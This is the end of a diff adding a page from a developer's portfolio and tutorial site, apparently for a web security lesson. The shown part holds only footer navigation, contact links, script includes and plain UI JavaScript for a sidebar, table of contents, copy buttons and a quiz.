+                <div class="foot-divider foot-divider-top"></div>
+
+                <div class="foot-main">
+                    <nav class="foot-col" aria-label="Services">
+                        <span class="foot-col-title text-caption fw-medium">Services</span>
+                        <ul class="foot-list">
+                            <li><a href="../../services/web-development" class="text-body-3">Full-Stack Web Apps</a></li>
+                            <li><a href="../../services/saas-product-development" class="text-body-3">SaaS Product Development</a></li>
+                            <li><a href="../../services/ai-integration" class="text-body-3">AI Integration</a></li>
+                            <li><a href="../../services/mobile-app-development" class="text-body-3">Mobile App Development</a></li>
+                            <li><a href="../../services/api-integrations" class="text-body-3">APIs &amp; Integrations</a></li>
+                            <li><a href="../../services/crm-erp-development" class="text-body-3">Business Software</a></li>
+                            <li><a href="../../services/ecommerce-development" class="text-body-3">E-commerce Development</a></li>
+                            <li><a href="../../services/cloud-devops-services" class="text-body-3">Cloud, DevOps &amp; Care</a></li>
+                            <li><a href="../../services" class="text-body-3">View all services</a></li>
+                        </ul>
+                    </nav>
+
+                    <nav class="foot-col" aria-label="Case studies">
+                        <span class="foot-col-title text-caption fw-medium">Case Studies</span>
+                        <ul class="foot-list">
+                            <li><a href="../../case-studies/mydigisense-digital-presence-marketplace-platform" class="text-body-3">MyDigiSense</a></li>
+                            <li><a href="../../case-studies/prodigichat-whatsapp-marketing-automation-platform" class="text-body-3">ProDigiChat</a></li>
+                            <li><a href="../../case-studies/digicrm-invoice-payment-management-crm" class="text-body-3">DigiCRM</a></li>
+                            <li><a href="../../case-studies/mailmaster-bulk-email-marketing-platform" class="text-body-3">MailMaster</a></li>
+                            <li><a href="../../case-studies/idmats-digital-marketing-technical-skills-institute" class="text-body-3">IDMATS</a></li>
+                            <li><a href="../../case-studies/digiconn-unite-digital-marketing-agency-website" class="text-body-3">DigiConn Unite</a></li>
+                            <li><a href="../../case-studies/flayermarketing-digital-marketing-agency-website" class="text-body-3">FlayerMarketing</a></li>
+                            <li><a href="../../case-studies" class="text-body-3">All case studies</a></li>
+                        </ul>
+                    </nav>
+
+                    <nav class="foot-col" aria-label="Learn">
+                        <span class="foot-col-title text-caption fw-medium">Learn</span>
+                        <ul class="foot-list">
+                            <li><a href="../../learn/dsa-master" class="text-body-3">DSA Master (all chapters)</a></li>
+                            <li><a href="../../learn/backend-master" class="text-body-3">Backend Master (all chapters)</a></li>
+                            <li><a href="../../learn/backend-master/how-the-internet-works-dns-tcp-tls" class="text-body-3">How the Internet Works</a></li>
+                            <li><a href="../../learn/backend-master/postgresql-indexes-explain-analyze-query-performance" class="text-body-3">PostgreSQL Indexes</a></li>
+                            <li><a href="../../learn/backend-master/authentication-passwords-sessions-jwt-oauth-mfa" class="text-body-3">Authentication in Node.js</a></li>
+                            <li><a href="../../learn/backend-master/system-design-for-backend-engineers" class="text-body-3">System Design for Backend</a></li>
+                            <li><a href="../../learn/dsa-master/big-o-notation-time-complexity" class="text-body-3">Big-O &amp; Time Complexity</a></li>
+                            <li><a href="../../learn/dsa-master/dynamic-programming-1d" class="text-body-3">Dynamic Programming</a></li>
+                        </ul>
+                    </nav>
+
+                    <nav class="foot-col" aria-label="Company">
+                        <span class="foot-col-title text-caption fw-medium">Company</span>
+                        <ul class="foot-list">
+                            <li><a href="/#about" class="text-body-3">About</a></li>
+                            <li><a href="../../services" class="text-body-3">Services</a></li>
+                            <li><a href="../../case-studies" class="text-body-3">Case Studies</a></li>
+                            <li><a href="../../blog" class="text-body-3">Blog</a></li>
+                            <li><a href="../../learn" class="text-body-3">Learn</a></li>
+                            <li><a href="../../contact" class="text-body-3">Contact</a></li>
+                        </ul>
+                    </nav>
+
+                    <div class="foot-col">
+                        <span class="foot-col-title text-caption fw-medium">Contact</span>
+                        <ul class="foot-contact-list">
+                            <li class="foot-contact-item"><svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M20 4H4a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2m0 4.7l-8 5.334L4 8.7V6.297l8 5.333l8-5.333z"/></svg><a href="mailto:shivam.it1311@gmail.com" class="text-body-3">shivam.it1311@gmail.com</a></li>
+                            <li class="foot-contact-item"><svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M6.62 10.79a15.15 15.15 0 0 0 6.59 6.59l2.2-2.2a1 1 0 0 1 1.02-.24a11.4 11.4 0 0 0 3.57.57a1 1 0 0 1 1 1V20a1 1 0 0 1-1 1A17 17 0 0 1 3 4a1 1 0 0 1 1-1h3.5a1 1 0 0 1 1 1c0 1.25.2 2.45.57 3.57a1 1 0 0 1-.25 1.02z"/></svg><a href="tel:+918958394972" class="text-body-3">+91 89583 94972</a></li>
+                            <li class="foot-contact-item"><svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 2a7 7 0 0 0-7 7c0 5.25 7 13 7 13s7-7.75 7-13a7 7 0 0 0-7-7m0 9.5A2.5 2.5 0 1 1 14.5 9A2.5 2.5 0 0 1 12 11.5"/></svg><span class="text-body-3">Agra, Uttar Pradesh, India</span></li>
+                            <li class="foot-contact-item"><svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 2a10 10 0 1 0 0 20a10 10 0 0 0 0-20m1 5v5.41l3.29 3.3l-1.41 1.41L11 13V7z"/></svg><span class="text-body-3">Replies within 24 hours</span></li>
+                        </ul>
+                        <div class="foot-badge">
+                            <span class="foot-status-dot" aria-hidden="true"></span>
+                            <span><span class="foot-badge-cap text-caption">Availability</span><strong class="text-body-3">Open to freelance &amp; full-time</strong></span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="foot-divider"></div>
+
+                <div class="foot-bottom">
+                    <p class="text-nocopy text-caption">&copy; 2026 Shivam Thakur &middot; Full Stack Developer</p>
+                    <p class="foot-bottom-mid text-caption">Based in Agra, India &middot; working worldwide</p>
+                    <div class="foot-meta">
+                        <a href="/sitemap.xml" class="text-caption">Sitemap</a>
+                        <a href="#" class="text-caption go-top">Back to top</a>
+                    </div>
+                </div>
+            </div>
+        </footer>
+        <!-- /Footer -->
+    </main>
+
+
+    <!-- Javascript -->
+    <script defer src="../../assets/js/jquery.min.js"></script>
+    <script defer src="../../assets/js/bootstrap.min.js"></script>
+    <script defer src="../../assets/js/jquery.nice-select.min.js"></script>
+    <script defer src="../../assets/js/jquery-validate.js"></script>
+    <script defer src="../../assets/js/swiper-bundle.min.js"></script>
+    <script defer src="../../assets/js/carousel.js"></script>
+    <script defer src="../../assets/js/infinityslide.js"></script>
+    <script defer src="../../assets/js/ScrollSmooth.js"></script>
+    <script defer src="../../assets/js/gsap.min.js"></script>
+    <script defer src="../../assets/js/SplitText.min.js"></script>
+    <script defer src="../../assets/js/ScrollTrigger.min.js"></script>
+    <script defer src="../../assets/js/ScrollToPlugin.min.js"></script>
+    <script defer src="../../assets/js/gsapAnimation.js"></script>
+    <script defer src="../../assets/js/countto.js"></script>
+    <script defer src="../../assets/js/animation-change-text.js"></script>
+    <script defer src="../../assets/js/main.js"></script>
+
+    <!-- Mobile Bottom Navigation Bar -->
+    <div class="mobile-bottom-nav d-lg-none">
+        <ul class="nav-list">
+            <li class="nav-item"><a href="/#home" class="item-link"><i class="icon icon-home"></i><span class="tool-tip">Home</span></a></li>
+            <li class="br-line"></li>
+            <li class="nav-item"><a href="/#about" class="item-link"><i class="icon icon-user-circle"></i><span class="tool-tip">About</span></a></li>
+            <li class="nav-item"><a href="../../case-studies" class="item-link"><i class="icon icon-tech-stack"></i><span class="tool-tip">Cases</span></a></li>
+            <li class="nav-item"><a href="../../services" class="item-link"><i class="icon icon-service"></i><span class="tool-tip">Services</span></a></li>
+            <li class="nav-item"><a href="../../blog" class="item-link"><i class="icon icon-quote"></i><span class="tool-tip">Blog</span></a></li>
+            <li class="nav-item"><a href="../../learn" class="item-link active"><i class="icon icon-edu"></i><span class="tool-tip">Learn</span></a></li>
+            <li class="br-line"></li>
+            <li class="nav-item"><a href="/contact" class="item-link"><i class="icon icon-send"></i><span class="tool-tip">Contact</span></a></li>
+        </ul>
+    </div>
+    <!-- /Mobile Bottom Navigation Bar -->
+    <!-- Floating Contact Buttons -->
+    <div class="float-contact">
+        <a href="#" class="float-btn float-top go-top" aria-label="Back to top"><i class="icon icon-arrow-top" aria-hidden="true"></i></a>
+        <a href="https://wa.me/918958394972" class="float-btn float-whatsapp" target="_blank" rel="noopener" aria-label="Chat on WhatsApp">
+            <svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M12.04 2C6.58 2 2.13 6.45 2.13 11.91c0 1.75.46 3.45 1.32 4.95L2 22l5.25-1.38a9.87 9.87 0 0 0 4.79 1.22h.01c5.46 0 9.91-4.45 9.91-9.91 0-2.65-1.03-5.14-2.9-7.01A9.82 9.82 0 0 0 12.04 2Zm0 18.13h-.01a8.2 8.2 0 0 1-4.19-1.15l-.3-.18-3.12.82.83-3.04-.2-.31a8.18 8.18 0 0 1-1.26-4.36c0-4.54 3.7-8.24 8.25-8.24a8.2 8.2 0 0 1 8.24 8.25c0 4.54-3.7 8.21-8.24 8.21Zm4.52-6.16c-.25-.12-1.47-.72-1.69-.81-.23-.08-.39-.12-.56.13-.16.24-.64.8-.78.97-.14.16-.29.18-.54.06-.25-.12-1.05-.39-1.99-1.23-.74-.66-1.23-1.47-1.38-1.72-.14-.25-.02-.38.11-.5.11-.11.25-.29.37-.43.13-.15.17-.25.25-.41.08-.17.04-.31-.02-.43-.06-.12-.56-1.34-.76-1.84-.2-.48-.41-.42-.56-.43h-.48c-.17 0-.43.06-.66.31-.23.25-.86.85-.86 2.07 0 1.22.89 2.4 1.01 2.56.12.17 1.75 2.67 4.23 3.74.59.26 1.05.41 1.41.52.59.19 1.13.16 1.56.1.48-.07 1.47-.6 1.67-1.18.21-.58.21-1.07.15-1.18-.06-.1-.23-.16-.48-.29Z"/></svg>
+        </a>
+        <a href="tel:+918958394972" class="float-btn float-call" aria-label="Call us">
+            <svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M6.62 10.79a15.53 15.53 0 0 0 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2Z"/></svg>
+        </a>
+    </div>
+    <!-- /Floating Contact Buttons -->
+
+
+    <script>
+    (function () {
+      var side = document.getElementById('learnSide'), toggle = document.getElementById('learnToggle'), filter = document.getElementById('learnFilter'), nav = document.getElementById('learnNav');
+      try { localStorage.setItem('backendMasterLast', "web-api-security-xss-csrf-ssrf-cors-owasp"); } catch (e) {}
+      toggle.addEventListener('click', function () { toggle.setAttribute('aria-expanded', side.classList.toggle('open')); });
+      filter.addEventListener('input', function () {
+        var q = filter.value.trim().toLowerCase();
+        nav.querySelectorAll('.learn-item').forEach(function (el) { el.hidden = !!q && el.dataset.text.indexOf(q) === -1; });
+      });
+      var act = nav.querySelector('.learn-item.active');
+      if (act) nav.scrollTop = Math.max(act.offsetTop - nav.offsetTop - 12, 0);
+
+      var toc = document.getElementById('learnToc'), mq = window.matchMedia('(min-width: 1200px)');
+      function syncToc() { toc.open = mq.matches; }
+      syncToc();
+      if (mq.addEventListener) mq.addEventListener('change', syncToc);
+      var subs = {};
+      toc.querySelectorAll('a').forEach(function (a) { subs[a.getAttribute('href').slice(1)] = a; });
+      if ('IntersectionObserver' in window) {
+        var cur = null;
+        var io = new IntersectionObserver(function (es) {
+          es.forEach(function (e) {
+            if (!e.isIntersecting || !subs[e.target.id]) return;
+            if (cur) cur.classList.remove('is-current');
+            cur = subs[e.target.id]; cur.classList.add('is-current');
+          });
+        }, { rootMargin: '-72px 0px -70% 0px' });
+        document.querySelectorAll('.learn-article h2[id]').forEach(function (h) { io.observe(h); });
+      }
+
+      document.addEventListener('click', function (e) {
+        var b = e.target.closest('.code-copy');
+        if (!b) return;
+        var code = b.closest('.code-block').querySelector('code');
+        var done = function () { b.textContent = 'Copied'; setTimeout(function () { b.textContent = 'Copy'; }, 1500); };
+        if (navigator.clipboard) navigator.clipboard.writeText(code.innerText).then(done, function () {});
+      });
+
+      var quiz = document.querySelector('[data-quiz]');
+      if (quiz) {
+        var score = 0, done = 0, total = quiz.querySelectorAll('.quiz-q').length, out = quiz.querySelector('.quiz-score');
+        quiz.addEventListener('click', function (e) {
+          var b = e.target.closest('.quiz-opt');
+          if (!b) return;
+          var q = b.closest('.quiz-q');
+          if (q.classList.contains('answered')) return;
+          q.classList.add('answered');
+          var ans = q.dataset.answer, ok = b.dataset.k === ans, note = q.querySelector('.quiz-note'), why = q.dataset.why ? ' ' + q.dataset.why : '';
+          if (ok) { score++; b.classList.add('is-correct'); } else { b.classList.add('is-wrong'); q.querySelector('[data-k="' + ans + '"]').classList.add('is-correct'); }
+          done++;
+          note.hidden = false;
+          note.textContent = (ok ? 'Correct.' : 'Not quite. The correct answer is ' + ans.toUpperCase() + '.') + why;
+          out.textContent = 'Score: ' + score + ' / ' + done + ' answered (' + total + ' questions)';
+        });
+      }
+    })();
+    </script>
+</body>
+</html>
